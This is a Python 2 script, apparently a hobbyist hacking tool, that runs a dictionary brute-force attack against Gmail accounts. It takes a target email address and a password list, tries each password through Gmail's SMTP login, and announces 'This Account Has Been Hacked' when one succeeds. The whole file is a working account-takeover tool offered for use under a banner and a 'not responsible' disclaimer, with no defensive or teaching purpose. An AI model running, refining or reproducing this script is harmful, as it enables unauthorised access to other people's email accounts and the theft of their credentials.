#!/usr/bin/python
'''create by Mafyia313'''

import smtplib
from os import system
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'

def main():
   print '================================================='
   print '               create by MR_NAIB                 '
   print '================================================='
   print 'My Facebook Mr Naib'      
   print 'Dont edit This script'                                          
   print 'I am Not responsible youre action'                               
   print 'My github Mafyia313'                                           
   print 'I am Form Pakistan'                                         
   print  'Enjoy'
   print '____  _____  _    _ _______ ______'
   print '|  _ \|  __ \| |  | |__   __|____|'
   print '| |_)| |__) | | |  |  | |   | |__'
   print '|  _  <|  _  /| |  |  |  | |  |  __|'
   print '|  |_) | | \ \| |__| |  | |  | |____ '
   print'|____/|_|  \_\\____/   |_|  |______|'
   print'\033{91;1mV.1.0'
   
   
   
main()
print'\033[92;1m[1] start the bruteforce attack'
print '[2] exit'
option = input('==>')
if option == 1:
   file_path = raw_input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
            
login()
